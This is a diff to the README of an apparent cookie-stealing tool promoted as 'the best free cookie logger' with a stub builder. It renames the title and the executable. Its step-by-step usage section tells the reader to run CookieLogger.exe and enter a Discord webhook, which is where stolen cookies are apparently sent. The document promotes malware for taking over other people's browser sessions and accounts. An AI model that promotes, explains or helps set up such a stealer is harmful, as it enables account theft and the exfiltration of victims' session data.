@@ -1,4 +1,4 @@
-# This Is The Best Free Cookie Logger
+# This Is The Best Free Cookie Logger That Uses A Stub Builder
 
 ![download](https://user-images.githubusercontent.com/108227869/177584583-e468fb2a-d8c8-4cf8-9d26-0fbc75e3bc6c.gif)
 
@@ -29,7 +29,7 @@ Step 1; Download Zip and extract
 
 Step 2; Run the requirements file and wait until it finishes and installs all requirements
 
-Step 3; run the NoobBeamer file and wait until the gui opens
+Step 3; run the CookieLogger.exe file and wait until the gui opens
 
 Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
 
